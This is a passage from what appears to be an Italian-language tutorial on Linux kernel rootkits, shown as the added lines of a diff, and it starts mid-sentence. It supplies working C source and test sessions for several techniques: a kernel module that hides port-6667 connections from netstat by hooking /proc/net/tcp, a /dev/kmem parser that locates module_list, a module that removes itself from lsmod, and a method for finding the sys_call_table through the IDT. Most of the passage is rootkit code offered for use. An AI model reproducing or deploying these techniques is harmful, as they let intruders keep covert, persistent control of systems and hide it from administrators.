+troviamo non "scriveremo" la riga incriminata nel buffer di output.
+Abbiamo percio` bisogno di individuare:
+
+- L'entry che rappresenta /proc/net/tcp nella lista del procfs.
+- La funzione che si occupa di generare i dati che saranno scritti in
+  /proc/net/tcp .
+
+La prima parte e` a dir poco immediata: il kernel ci mette gentilmente a
+disposizione un puntatore a /proc/net che si chiama proc_net, percio` non
+dovremo fare altro che fare proc_net->subdir per accedere ai files che
+contiene, e li` scorrere la lista di next in next fino a trovare l'entry dal
+nome "tcp".
+La seconda parte e` un po' meno immediata, ma non per chissa` che difficolta`,
+ma semplicemente perche` nelle entry di /proc/net la funzione di lettura non e`
+la read_proc, bensi` la get_info. [Si puo' verificare facilmente guardando i
+sorgenti del kernel]. Comunque sia, ora che vi ho detto questo e` diventata una
+cosa immediata, percio` non c'e` piu` nessun problema :-)
+
+Vortex:~# rgrep proc_net_create /usr/src/linux/* | grep tcp
+...
+/usr/src/linux/net/ipv4/af_inet.c:    proc_net_create ("tcp", 0, tcp_get_info);
+...
+Vortex:~#
+
+La funzione che si occupa di registrare una nuova entry in /proc/net e` la
+proc_net_create che come ultimo argomento ha la funzione che verra` utilizzata
+per la generazione dell'output.
+Come possiamo vedere dal grep la funzione "incriminata" e` la tcp_get_info.
+Dal file /usr/src/linux/net/ipv4/tcp_ipv4.c :
+
+#define TMPSZ 150
+int tcp_get_info(char *buffer, char **start, off_t offset, int length)
+{
+    int len = 0, num = 0, i;
+    off_t begin, pos = 0;
+    char tmpbuf[TMPSZ+1];
+
+    if (offset < TMPSZ)
+    len += sprintf(buffer, "%-*s\n", TMPSZ-1,
+                       "  sl  local_address rem_address   st tx_queue "
+                       "rx_queue tr tm->when retrnsmt   uid  timeout inode");
+    ...
+    ...
+}
+
+Riconoscete la stringa che viene scritta nel buffer? E` esattamente quella che
+abbiamo visto guardando in /proc/net/tcp, quella che si trovava sopra l'elenco
+delle connessioni. Guardate bene quanto viene scritto nel buffer, TMPSZ-1 che
+col \n finale diventa TMPSZ.
+Verifichiamo:
+Vortex:~# cat /proc/net/tcp
+  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt
+  sl  uid  timeout inode
+Vortex:~# cat /proc/net/tcp | wc -c
+ 150
+Vortex:~#
+
+Ottimo, corrisponde, e se andate a vedere anche il resto del codice noterete
+che vengono sempre scritti TMPSZ bytes, ogni riga cioe` e` di lunghezza fissa.
+Questo ci semplifica enormemente il lavoro di filtraggio in quanto sappiamo
+entro quanty bytes dobbiamo aspettarci la stringa da filtrare e possiamo
+"tagliarla" di netto senza paura di danneggiare altre entry.
+Osservate anche questa riga:
+  
+if (offset < TMPSZ)
+  
+Apparentemente non dice molto, ma pensateci un attimo: se il kernel chiama
+questa funzione per riempire /proc/net/tcp la riga di intestazione dovra`
+esserci sempre, percio` perche` mettere la sprintf dietro questa condizione?
+La risposta e` che non e` detto che una sola chiamata alla tcp_get_info riesca
+a completare il lavoro, e nel caso in cui venga richiamata una seconda volta
+il valore offset ci dice quanto abbiamo gia` scritto. Nel caso in cui non
+avessimo ancora scritto niente, offset e` di certo minore di TMPSZ, percio` e`
+giusto che venga scritta l'intestazione. Quando invece offset e` maggiore non
+e` necessario fare niente e percio` viene saltato.
+Per filtrare percio` dovremo:
+
+- Leggere una riga alla volta.
+- Controllare se e' una riga da eliminare.
+- Nel caso in cui non lo sia dobbiamo patchare l'identificatore della
+  connessione e poi scriverla nel buffer. [Ricordate il numerino sulla
+  sinistra? Se ci fossero 3 connessioni e la seconda fosse nascosta gli
+  identificatori visibili sarebbero 0 e 2, mentre dovrebbero essere 0 ed 1.
+  Quello che noi faremo sara' assicurarci che ci sia il numerino esatto].
+- Copiare il buffer modificato sul buffer originario.
+
+Ora, ricordiamoci che la funzione potrebbe venire chiamata piu` volte, dobbiamo
+assicurarci che "offset" non vada mai oltre un certo valore [ovvero la
+dimensione dell'output modificato da noi] perche` potrebbe trovare valori
+"scomodi". Dobbiamo percio` calcolare le dimensioni dell'output maligno e fare
+in modo che offset non superi mai quel valore.
+Ecco l'implementazione di quanto spiegato fin'ora:
+
+<-| LKEPD/nethide.c |-> 
+#define __KERNEL__
+#define MODULE
+#define LINUX
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/dirent.h>
+#include <linux/unistd.h>
+#include <linux/mm.h>
+#include <asm/uaccess.h>
+#include <sys/syscall.h>
+#include <linux/proc_fs.h>
+MODULE_LICENSE("GPL");
+#define HPORT 6667 /* Nasconderemo tutte le connessioni con porta uguale
+                      alla 6667 */
+#define NET_LINE_MAX_LENGTH 150
+
+int (*o_get_info)(char *page, char **start, off_t pos, int count);
+
+struct proc_dir_entry *get_tcp(void)
+{
+/* Cerchiamo l'entry "tcp" */
+
+	struct proc_dir_entry *ptr=proc_net->subdir;
+	while(strcmp(ptr->name,"tcp"))
+		ptr=ptr->next;
+	return ptr;
+}
+
+char *strnstr(const char *dove, const char *cosa, size_t lungo)
+{
+/* Controlliamo la presenza di una stringa in un'altra entro
+   "lungo" bytes. L'output della tcp_get_info sara` tutto "in fila"
+    percio` usiamo questa funzione per controllare TMPSZ bytes e cosi`
+    andare di riga in riga
+ */
+    
+        char *str = strstr(dove, cosa);
+        if (!str)
+                return NULL;
+        if (str-dove+strlen(cosa) <= lungo)
+                return str;
+        else
+                return NULL;
+}
+
+/* Calcoliamo la lunghezza del "nostro" output */
+
+int get_newsize(void)
+{
+	char page[NET_LINE_MAX_LENGTH*10+1],*start,*ptr,
+	     porta[12];
+
+	int length=0,result,found=0;
+
+	sprintf(porta,":%04X",HPORT);
+	printk("%s\n",porta);
+	while(1) 
+	{
+		memset(page,0,sizeof(page));
+		/* Chiamiamo la funzione originaria e quando ha finito usciamo
+		   dal ciclo */
+		if ((result=o_get_info(page,&start,length,sizeof(page)-1))<=0)
+			break;
+
+		/* Sommiamo il risultato parziale agli altri in modo da
+		   avere alla fine il numero totale dei bytes letti
+		 */
+		length+=result;
+		for(ptr=start;ptr<start+result;ptr+=NET_LINE_MAX_LENGTH)
+		{
+			/* Controlliamo di riga in riga se troviamo la stringa
+			   da nascondere, in caso affermativo si aumenta la
+			   variabile che ci dice quante stringhe dobbiamo
+			   eliminare
+			 */
+			if(strnstr(ptr,porta,NET_LINE_MAX_LENGTH)) {
+				found++;
+			}
+		}
+	}
+	/* ritorniamo i bytes totali meno quelli occupati da stringhe da
+	   eliminare */
+	return length-found*NET_LINE_MAX_LENGTH;
+ }
+
+
+int n_get_info (char *page, char **start, off_t pos, int count)
+{
+	int result,connections;
+	char *temp,*to_ptr,*from_ptr,porta[12];	
+	/* Se abbiamo gia` scritto tutto il possibile ritorniamo 0 */
+	if (pos >= get_newsize())
+		return 0;
+
+	if ((result=o_get_info(page,start,pos,count))<=0)
+		return result;
+
+	
+	temp=(char*)kmalloc(result+NET_LINE_MAX_LENGTH+1,GFP_KERNEL);
+	memset(temp,0,result+NET_LINE_MAX_LENGTH+1);
+
+	to_ptr=temp;
+
+	if(pos>=NET_LINE_MAX_LENGTH)
+	{
+		from_ptr=page;
+		/* Se non e` la prima volta che la funzione viene chiamata
+		   dobbiamo calcolare il numero delle connessioni gia` scritte.
+		   Siccome si va di TMPSZ in TMPSZ dividendo i bytes scritti
+		   per TMPSZ e decrementando di 1 (la loro numerazione va da 0
+		   ad n-1) otteniamo il prossimo identificatore numerico da
+		   utilizzare
+		 */
+		connections=(pos/NET_LINE_MAX_LENGTH)-1;
+	}
+	else
+	{
+		/* Se e` la prima volta che veniamo chiamati
+		 * dobbiamo copiare la stringa di intestazione
+		 * nel nostro buffer temporaneo, incrementare
+		 * i puntatori per le copie ed inizializzare
+		 * l'identificatore delle connessioni
+		 */
+
+		memcpy(to_ptr,page,NET_LINE_MAX_LENGTH);
+		to_ptr+=NET_LINE_MAX_LENGTH;
+		from_ptr=page+NET_LINE_MAX_LENGTH;
+		connections=0;
+	}
+
+	for(;from_ptr<page+result;from_ptr+=NET_LINE_MAX_LENGTH)
+	{
+		sprintf(porta,":%04X",HPORT);
+		/* Se nella stringa corrente non c'e` la sottostringa da
+		   eliminare patchiamo l'identificatore, copiamo la stringa
+		   nel buffer temporaneo, incrementiamo il puntatore che ci
+		   dice dove scrivere ed il numero di connessione
+		 */
+		 
+		if(!(strnstr(from_ptr,porta,NET_LINE_MAX_LENGTH)))
+		{
+		/* Patchiamo */
+			sprintf(porta,"%4d:",connections);
+			strncpy(from_ptr,porta,strlen(porta));
+		/* Copiamo */
+		
+			memcpy(to_ptr,from_ptr,NET_LINE_MAX_LENGTH);
+			
+		/* Incrementiamo */
+			to_ptr+=NET_LINE_MAX_LENGTH;
+			connections++;
+		}
+	}
+      
+      /* Sovrascriviamo */
+      
+	memcpy(page,temp,result);
+
+      /* Fix delle dimensioni (se necessario) */
+      
+	connections=strlen(temp);
+	
+	if(result<0)
+		result=0;
+	else if(result>connections)
+		result=connections;
+	
+	*start = page;
+	kfree(temp);
+	
+	return result;
+}
+
+int init_module(void) {
+	struct proc_dir_entry *tcp=get_tcp();
+	o_get_info=tcp->get_info;
+	tcp->get_info=n_get_info;
+	return 0;
+}
+
+void cleanup_module(void) 
+{
+	struct proc_dir_entry *tcp=get_tcp();
+	tcp->get_info=o_get_info;
+}
+<-X->
+
+Vortex:~# netstat -an | grep 6667
+tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN
+Vortex:~# insmod nethide.o
+Vortex:~# netstat -an | grep 6667
+Vortex:~# rmmod nethide
+Vortex:~# netstat -an | grep 6667
+tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN
+Vortex:~#
+
+Perfetto, ed ora che abbiamo visto questa tecnica, volendo, potremmo riscrivere
+l'occultamento di processi usando proc e senza bisogno di andare a monitorare
+tutte quelle syscall che interagiscono con una directory dato che basterebbe
+lavorare con le inode_operations di proc... :) Ve lo lascio come esercizio.
+
+
+- CONSIDERAZIONI
+
+Senza ombra di dubbio e` una tecnica estremamente comoda la modifica delle
+funzioni del procfs, senza contare che ci sono molte altre funzioni che
+possiamo andare a sostituire, non esistono solo la read_proc e la get_info,
+questi sono stati esempi per farvi capire quanto facile possa essere. C'e un
+problema pero':
+Vortex:~# grep tcp_get_info /boot/System.map
+c0265e10 T tcp_get_info
+Vortex:~#
+Le modifiche ai puntatori possono essere individuate attraverso un controllo
+coi valori presenti in System.map. Cosi` facendo abbiamo solamente spostato il
+problema, ma non risolto, in quanto adesso tutti sanno che e` buona cosa
+controllare anche quelle funzioni. Una possibile soluzione potrebbe essere
+integrare la tecnica del salto in questa del procfs, ovvero modificare i primi
+bytes della tcp_get_info (ad esempio) e farla saltare nella nostra
+n_tcp_get_info, oppure potremmo adottare delle tecniche un po` piu` avanzate,
+cosa che vedremo tra breve. Comunque sia, ce ne sono di soluzioni, avete solo
+l'imbarazzo della scelta :-)
+
+
+SEZIONE V
+=========
+
+- MEMORY PARSER
+  
+Nella parte sulla redirezione di una qualsiasi funzione ho parlato della
+realizzazione di strumenti appositi che possano fornirci quegli indirizzi di
+funzioni non esportate che ci servono per i nostri hook. Quegli strumenti sono
+i parser di memoria.
+Un parser di memoria, come dice il nome, non e` altro che un programma che
+attraverso algoritmi di analisi della memoria piu` o meno sofisticati e` in
+grado di fornirci un indirizzo od un qualsiasi valore che ci serva. Ora ne
+implementeremo uno in modo da darvi un'idea di come dovete procedere per la
+loro realizzazione. Tuttavia, con l'utilizzo di questi programmi, si rende
+molto meno pulito il nostro lavoro, infatti un parser puo' restituire un
+indirizzo errato (con conseguente crash della macchina al 99% dei casi) oppure
+non trovare proprio niente. E` fondamentale percio` testarli con molti
+kernel/configurazioni differenti per non avere brutte sorprese.
+    
+- KMEM
+
+Il file /dev/kmem e` un file speciale (una character device per essere precisi)
+che e` un'immagine della memoria virtuale del kernel. In parole povere,
+accedendo a questo file si puo' leggere/scrivere direttamente nella memoria
+del kernel.
+Sfrutteremo questo file per andare a leggere la memoria del kernel su cui
+faremo parsing.
+  
+- L'IMPLEMENTAZIONE
+
+Creiamo un parser che vada a trovare in memoria l'indirizzo della module_list
+ad esempio.
+
+1)
+   
+ Dobbiamo avere un'idea molto precisa della struttura del kernel in memoria
+ per effettuare questo tipo di ricerche, quindi dobbiamo trovare un sistema
+ per scoprire com'e` fatto.
+ Fortunatamente se ci spostiamo nella directory dei sorgenti del kernel dopo
+ la compilazione noteremo la presenza di un file, vmlinux. Questo e`
+ un'immagine non compressa del kernel che abbiamo compilato (e che state
+ facendo girare spero:), quindi basta crearne un dump human-readable con
+ objdump per ottenere letteralmente una mappa della memoria.
+
+ Vortex:/usr/src/linux# objdump -D vmlinux > vmlinuxdump
+ Vortex:/usr/src/linux# ls vmlinuxdump
+  -rw-r--r--    1 root     root     43440490 Mar  6 02:03 vmlinuxdump
+ Vortex:/usr/src/linux# cat vmlinuxdump
+     
+  vmlinux:     file format elf32-i386
+      
+      Disassembly of section .text:
+       
+       c0100000 <startup_32>:
+       c0100000:       fc                      cld
+       c0100001:       b8 18 00 00 00          mov    $0x18,%eax
+       c0100006:       8e d8                   mov    %eax,%ds
+       c0100008:       8e c0                   mov    %eax,%es
+       ...
+
+ e cosi` via.
+
+2)
+
+ Facciamo un grep per ottenere l'indirizzo della module_list :
+
+ Vortex:/usr/src/linux# grep \<module_list\> vmlinuxdump
+  c030b100 <module_list>:
+
+ poi apriamo il dump, con less ad esempio, e facciamo una ricerca di questo
+ indirizzo per vedere dove compare. Se siamo fortunati una funzione esportata
+ od una a cui e` facile risalire usera` module_list, se non lo siamo ci
+ tocchera` prendere nota delle funzioni che lo utilizzano e poi iniziare a
+ trovare il modo di rintracciare quelle funzioni e cosi` ricorsivamente. Piu`
+ livelli di ricorsivita` ci sono, ovviamente, piu` e` facile commettere
+ errori, percio` cercate di ridurli al minimo. Per aiutarvi, ad esempio,
+ potreste anche utilizzare un modulo: mettiamo il caso che stiate cercando un
+ simbolo non esportato, ma a cui un modulo puo' accedere facilmente, come la
+ tcp_get_info, create un modulo ad hoc che vi restituisca l'indirizzo e poi
+ potete continuare il vostro lavoro con una percentuale di errore diminuita di
+ molto.
+ Ritornando alla module_list, siamo stati abbastanza fortunati: la utilizza
+ una syscall, la sys_create_module:
+ 
+ ...
+ ...
+ c011ff30:   a1 00 b1 30 c0          mov    0xc030b100,%eax  <----
+ c011ff35:   89 43 04                mov    %eax,0x4(%ebx)
+ c011ff38:   81 3d 18 b1 30 c0 ad    cmpl   $0xdead4ead,0xc030b118
+ c011ff3f:   4e ad de
+ c011ff42:   89 1d 00 b1 30 c0       mov    %ebx,0xc030b100  <----
+ c011ff48:   74 08                   je     c011ff52 <sys_create_module+0x192>
+ ...
+ ...  
+ 
+ Come potete vedere, l'indirizzo che ci interessa e` utilizzato come argomento
+ di una mov dopo il cmpl con quel numero cosi` appariscente, 0xdead4ead.
+ Possiamo percio` pensare che sia una sorta di controllo con un valore fisso.
+
+ Vortex:/usr/src/linux# rgrep 0xdead4ead ./*
+  ./include/asm/spinlock.h:#define SPINLOCK_MAGIC 0xdead4ead
+    
+ Infatti. Possiamo percio` procedere in questo modo: otteniamo l'indirizzo
+ della sys_create_module dalla sys_call_table, da li` ci spostiamo ad
+ analizzare la sys_create_module cercando un'istruzione cmp con quel valore
+ come argomento seguita da una mov. Uno degli argomenti della mov e`
+ l'indirizzo che ci serve.
+
+3)
+   
+ Non dobbiamo dimenticare pero` che quello che noi andremo a leggere non
+ saranno comode istruzioni in assembly, ma sara` codice macchina. Non
+ disperate, qualcuno ci ha gia` pensato, sono infatti disponibili sul
+ sito http://bastard.sourceforge.net le libdisasm, delle librerie che
+ permettono di convertire codice macchina => istruzioni assembly in modo
+ estremamente semplice.
+
+<-| LKEPD/parser.c |->
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <bastard.h>
+#include <libdis.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+#include <errno.h>
+
+#define KMEM "/dev/kmem"
+#define SIZE 20
+#define SYS_CALL_TABLE 0xindirizzo_della_sys_call_table
+
+int             stalk_module_list(int fd);
+
+int
+main(void)
+{
+    int             file_descriptor;
+    if ((file_descriptor = open(KMEM, O_RDONLY)) < 0) {
+	fprintf(stderr, "Cannot open kmem\n");
+	exit(-1);
+    }
+    if (lseek(file_descriptor, SYS_CALL_TABLE, SEEK_SET) == -1) {
+	fprintf(stderr, "Cannot set right offset\n");
+	close(file_descriptor);
+	exit(-1);
+    }
+    disassemble_init(0, ATT_SYNTAX);
+
+    if ((stalk_module_list(file_descriptor)) < 0)
+	exit(-1);
+
+    disassemble_cleanup();
+    close(file_descriptor);
+    return 0;
+}
+
+int
+stalk_module_list(int fd)
+{
+#define MAGIC   "dead4ead"
+
+    unsigned char   buffer[SIZE];
+    unsigned char   tmpbuffer[SIZE];
+    unsigned long   address;
+    unsigned long   s_c_t[256];
+    struct instr    istruzione;
+    int             i,
+                    j;
+
+    /*
+     * Leggiamo e memorizziamo tutta la sys call table 
+     */
+    if (read(fd, s_c_t, 256 * 4) <= 0)
+	return -1;
+    /*
+     * Memorizziamo l'indirizzo della syscall che dobbiamo analizzare 
+     */
+    address = s_c_t[SYS_create_module];
+
+    for (i = 0;; i += j) {
+	if (lseek(fd, address + i, SEEK_SET) == -1)
+	    return -1;
+	if (read(fd, buffer, SIZE) < SIZE) {
+	    fprintf(stderr, "Cannot read\n");
+	    return -1;
+	}
+
+	if ((j = disassemble_address(buffer, &istruzione))) {
+	    if (istruzione.mnemonic[0] != 0)
+	    /* Controllo che istruzione e` */
+		if ((strstr(istruzione.mnemonic, "cmp")))
+		    if (istruzione.src[0] != 0) {
+		    /* Le libdisasm trasformano in signed i valori che
+		       trovano, percio` saranno sotto forma di -0xabcdef ad
+		       esempio. Il nostro invece e` un numero unsigned,
+		       percio` trasformiamo il valore che trovano le
+		       libdisasm in unsigned, poi confrontiamo le 2 stringhe
+		     */
+			sprintf(tmpbuffer, "%x",
+				strtoul((char *) &istruzione.src[1], NULL,
+					16));
+			if (strstr(tmpbuffer, MAGIC)) {
+			    /*
+			     * Ok ora dobbiamo controllare l'istruzione
+			     * successiva 
+			     */
+			    if (lseek(fd, address + i + j, SEEK_SET) == -1)
+				return -1;
+			    if (read(fd, buffer, SIZE) < SIZE) {
+				fprintf(stderr, "Cannot read\n");
+				return -1;
+			    }
+			    if (disassemble_address(buffer, &istruzione) >
+				0) {
+				if (istruzione.mnemonic[0] != 0)
+				    if ((strstr
+					 (istruzione.mnemonic, "mov")))
+					if (istruzione.dest[0] != 0) {
+					    printf("0x%x\n",
+						   strtoul((char *)
+							   &istruzione.
+							   dest, NULL,
+							   16));
+					    break;
+					}
+			    }
+			}
+		    }
+
+	}
+
+	else
+	/* In caso non riesca a disassemblare aumenta di 1, altrimenti si
+	   creerebbe un loop */
+	    j = 1;
+    }
+    return 0;
+}
+<-X->
+
+ Vortex:~# gcc -ldisasm parser.c -o parser
+ Vortex:~# ./parser
+ 0xc030b100
+ Vortex:~# grep c030b100 /boot/System.map
+ c030b100 D module_list
+ Vortex:~#
+
+
+- COME NASCONDERE UN MODULO
+
+Come potete immaginare, non vi ho fatto cercare la module_list per nulla :)
+Ora vedremo come sfruttarla per nascondere il nostro modulo.
+Tutti i moduli durante la creazione vengono agganciati in testa ad una lista,
+e la testa di questa lista e` proprio module_list. L'idea e` semplice:
+scorriamo questa lista fino a trovare il nostro modulo, quando lo troviamo
+replichiamo (in parte) il funzionamento della sys_delete_module, ma NON
+liberiamo la memoria occupata dal modulo: cosi` facendo le zone di memoria
+rimarrano occupate dal nostro codice, ma il modulo sara` cancellato dal
+sistema, percio` tutti i nostri hack continueranno ad essere funzionanti :)
+
+<-| LKEPD/cloack.c |->
+#define MODULE
+#define LINUX
+
+#ifdef CONFIG_MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/sched.h>
+
+#define MODULE_LIST /* Qui inserite il valore che vi ha restituito il parser */
+
+struct module **my_module_list=(struct module **)MODULE_LIST;
+struct module *my_find_module(char *);
+char *name;
+MODULE_PARM(name,"s");
+int hide(char *name)
+{
+	struct module *module = NULL;
+	
+		
+	module = my_find_module(name);
+	if (module != NULL) {
+		module->flags |= MOD_DELETED;
+		if (module->flags & MOD_RUNNING)
+			module->flags &= ~MOD_RUNNING;
+		if (module == *my_module_list)
+			*my_module_list = module->next;
+		else {
+			struct module *runner;
+			/* Attraverso i puntatori ->next si scorre la lista di
+			   moduli */
+			for (runner = *my_module_list; runner->next != module; \
+			                           runner = runner->next)
+				continue;
+			runner->next = module->next;
+		}
+	} 
+	
+	return 0;
+}
+
+struct module *
+my_find_module(char *name)
+{
+      struct module *mod;
+      for (mod = *my_module_list; mod ; mod = mod->next) {
+              if (mod->flags & MOD_DELETED)
+                    continue;
+	/* Il campo name contiene il nome del modulo */
+              if (strstr(mod->name, name))
+                    break;
+      }
+      return mod;
+}
+
+int init_module(void) {
+	hide(name);
+	return 0;
+}
+<-X->
+
+Vortex:~# lsmod | grep test
+test                        372    0  (unused)
+Vortex:~# insmod cloack.o name=test
+Vortex:~# lsmod | grep test
+Vortex:~#
+
+
+- UNO SGUARDO AI 2.6
+
+Il parser mostrato prima e` perfettamente funzionante, ma necessita
+dell'indirizzo della sys call table per poter funzionare, indirizzo che nei
+kernel della versione 2.6.x non e` piu esportato. Dobbiamo trovare percio` un
+sistema affidabile per trovare questo indirizzo.
+
+
+- INTERRUPT DESCRIPTOR TABLE
+
+Un interrupt puo' essere definito come un evento che altera la sequenza di
+istruzioni eseguita dal processore.
+Ad esempio, quando chiamiamo una syscall succede questo: vengono sistemati i
+valori opportuni nei registri in base a che syscall stiamo utilizzando e poi
+viene chiamato l'interrupt numero 0x80. Praticamente diciamo al kernel: il
+tipo di interrupt che ti mandiamo e` questo (0x80) e nei registri trovi i
+parametri, fai quel che devi.
+L'interrupt descriptor table e` una tabella che associa ciascun interrupt coni
+la routine che deve essere eseguita per gestirlo.
+Guardate questo piccolo programma di esempio:
+
+int main(void) {
+     char *ciao="ciao\n";
+     asm volatile ("mov $0x4,%%eax\n" <- Mettiamo il numero 4 nel registro eax.
+                                         Il 4 corrisponde al numero della
+                                         sys_write.
+                   "mov $0x1,%%ebx\n" <- Mettiamo il numero 1 in ebx.
+                                         Questo parametro rappresenta il file
+					 descriptor dove andra` a scrivere la
+                                         write. 1 significa standard output.
+                   "mov $0x5,%%edx\n" <- Il 5 sono i bytes che la funzione
+                                         dovra` scrivere.
+                   "mov %0,%%ecx\n"   <- Mettiamo l'indirizzo contenuto nella
+                                         variabile ciao in ecx. %0 significa
+                                         il primo argomento di input, ovvero
+                                         quello poco piu` sotto :"m" (ciao).
+                                         Gli stiamo dicendo di caricare dalla
+                                         memoria [ "m" ] il contenuto della
+                                         variabile ciao [ (ciao) ] e metterlo
+                                         in ecx.
+                   "int $0x80"        <- Chiamiamo l'interrupt.
+                   :
+                   :"m" (ciao)
+                   );
+}
+
+Vortex:~# ./tmp
+ciao
+Vortex:~#
+
+Questo significa che nella routine assegnata all'interrupt 0x80 c'e` un
+sistema per risalire alle funzioni della sys call table od alla sys call
+table, vediamo percio` prima di trovare questa routine, poi di analizzarla.
+
+
+- INT 0x80
+
+L'interrupt descriptor table e` una tabella di 256 entry grandi 8 bytes
+l'una la cui struttura e` a grandi linee la seguente:
+
+ 63                      48|47           40|39              32  
+ +------------------------------------------------------------
+ |                         |                                 |
+ | HANDLER ADDR   (16-31)  |	     NOT INTERESTING	     |
+ |                         |                                 |
+ =============================================================
+ |                         |				     |
+ |    NOT INTERESTING      | 	     HANDLER ADDR   (0-15)   |
+ |                         |				     |
+ ------------------------------------------------------------+
+ 31                      16|15                               0
+
+Come possiamo vedere l'indirizzo dell'handler e` diviso in due all'interno
+degli 8 bytes dell'entry, dovremo percio` ricompattarlo prima di poterlo
+usare.
+A questo punto dobbiamo solamente accedere alla posizione 0x80 dell'IDT per
+trovare l'indirizzo della routine da analizzare per risalire all'indirizzo
+della sys call table.
+Ma come facciamo a risalire all'indirizzo dell'IDT? Esiste un'istruzione
+assembly che ci restituisce questo indirizzo, la " sidt " :)
+Vediamo percio` come risalire prima all'IDT e poi all'indirizzo della routine
+che ci interessa:
+
+<-| LKEPD/int80sidt.c |->
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#define KMEM "/dev/kmem"
+ 
+struct {
+    unsigned short not_interesting;
+    unsigned int start;
+} __attribute__ ((packed)) idt;
+
+struct {
+    unsigned short addr1;
+    unsigned char  not_interesting[4];
+    unsigned short addr2;
+} __attribute__ ((packed)) idt_entry;
+
+/* Legge da un file descriptor tot bytes ad una posizione specificata */
+int kread(int des, unsigned long addr, void *buf, int len)
+{
+    int rlen;
+    if(lseek(des, (off_t)addr, SEEK_SET) == -1)
+                  return -1;
+    if((rlen = read(des, buf, len)) != len)
+                  return -1;
+    return rlen;
+}
+		 
+int main(void)
+{
+ int kmem;
+ unsigned long int80_routine;
+
+ /* Mettiamo l'output dell'istruzione nella variabile idt */
+ asm ("sidt %0" : "=m" (idt));
+ 
+ if ((kmem=open(KMEM, O_RDONLY))<0)
+ 	return -1;
+	
+ /* Ci spostiamo di 0x80 posizioni grandi ciascuna 8 bytes dal punto di
+    partenza della IDT, poi leggiamo l'entry corrispondente, ovvero quella
+    dell'int 0x80
+ */
+ if (kread(kmem, idt.start+8*0x80, &idt_entry, sizeof(idt_entry))<0)
+ 		return -1;
+ /* Ricompattiamo l'indirizzo */
+ int80_routine= (idt_entry.addr2 << 16) | idt_entry.addr1;
+ 
+ printf("Int80 handler=%x\n",int80_routine);
+ close(kmem);
+ return 0;
+}
+<-X->
+	
+Vortex:~# ./int80sidt
+Int80 handler=c0107b0c
+Vortex:~# grep c0107b0c /boot/System.map
+c0107b0c T system_call
+Vortex:~#
+
+Bingo :>
+
+
+- SYS CALL TABLE
+
+Andiamo subito a vedere nel dump di vmlinux com'e` fatta la funzione appena
+trovata:
+
+  c0107b0c <system_call>:
+  c0107b0c:       50                      push   %eax
+  c0107b0d:       fc                      cld
+  c0107b0e:       06                      push   %es
+  c0107b0f:       1e                      push   %ds
+  c0107b10:       50                      push   %eax
+  c0107b11:       55                      push   %ebp
+  c0107b12:       57                      push   %edi
+  c0107b13:       56                      push   %esi
+  c0107b14:       52                      push   %edx
+  c0107b15:       51                      push   %ecx
+  c0107b16:       53                      push   %ebx
+  c0107b17:       ba 18 00 00 00          mov    $0x18,%edx
+  c0107b1c:       8e da                   mov    %edx,%ds
+  c0107b1e:       8e c2                   mov    %edx,%es
+  c0107b20:       bb 00 e0 ff ff          mov    $0xffffe000,%ebx
+  c0107b25:       21 e3                   and    %esp,%ebx
+  c0107b27:       f6 43 18 02             testb  $0x2,0x18(%ebx)
+  c0107b2b:       75 5f                   jne    c0107b8c <tracesys>
+  c0107b2d:       3d 0e 01 00 00          cmp    $0x10e,%eax
+  c0107b32:       0f 83 81 00 00 00       jae    c0107bb9 <badsys>
+  c0107b38:       ff 14 85 f8 8f 30 c0    call   *0xc0308ff8(,%eax,4)
+  c0107b3f:       89 44 24 18             mov    %eax,0x18(%esp,1)
+  c0107b43:       90                      nop
+   
+Guardate la call, quella sul fondo, l'indirizzo non vi sembra familiare?
+
+ Vortex:~# grep c0308ff8 /proc/ksyms
+ c0308ff8 sys_call_table_Rsmp_dfdb18bd
+ Vortex:~#
+
+Esattamente quello che stavamo cercando. Ora basta un banale parsing della
+funzione per risalire all'indirizzo che ci interessa :-) Volendo non serve
+nemmeno scomodare le libdisasm, l'opcode di quel tipo di call e` fisso,
+percio` basterebbe leggere la funzione e cercare al suo interno "\xff\x14\x85":
+
+ unsigned long sys_call_table;
+ ....
+
+ void *ptr=memmem(buffer_contenente_la_funzione,"\xff\x14\x85",100);
+ sys_call_table= *(unsigned long*)ptr+3; /* I 3 bytes del pattern ;) */
+
+Ecco fatto :-)
+
+
+- CONSIDERAZIONI
+
+In questa sezione, anche se fino ad ora non gli si e` dato molto peso, abbiamo
+introdotto una cosa importantissima, kmem. Fino ad adesso l'abbiamo utilizzato
+solo come un file dove andare a leggere le informazioni che ci servivano, ma
+non dobbiamo dimenticare che su questo file possiamo andare anche a 
+scrivere... ~:)
+
+Abbiamo anche visto come fa` il sistema a risalire alla sys call table, ma ora
+vi chiedo: e` proprio necessario andare a modificare la sys call table per
+redirigere le sue funzioni? ~:)
+
+
+SEZIONE VI 
+==========
+
+- HIJACKING DELLA SYS CALL TABLE
+
+La risposta ovviamente e` no :) Pensateci un attimo, se il sistema risale alla
+sys call table semplicemente tramite l'indirizzo che andiamo a scoprire col
+giochetto sidt/parsing sarebbe uno scherzetto andare a modificare quel
+valore...
+Controlliamo:
+
+ Vortex:~# grep sys_call_table /proc/ksyms
+ c0308ff8 sys_call_table_Rsmp_dfdb18bd
+ Vortex:~# grep c0308ff8 /usr/src/linux/vmlinuxdump
+ c0107b38:       ff 14 85 f8 8f 30 c0    call   *0xc0308ff8(,%eax,4)
+ c0107ba4:       ff 14 85 f8 8f 30 c0    call   *0xc0308ff8(,%eax,4)
+ c0308ff8 <sys_call_table>:
+ c0308ff8:       60                      pusha
+ Vortex:~#
+ 
+Chiaramente gli ultimi due match sono irrilevanti, ma andando a controllare i
+primi due vediamo che il primo corrisponde al valore che troviamo con la
+tecnica esposta poco fa, mentre il secondo appartiene a questa funzione:
+
+ c0107b8c <tracesys>:
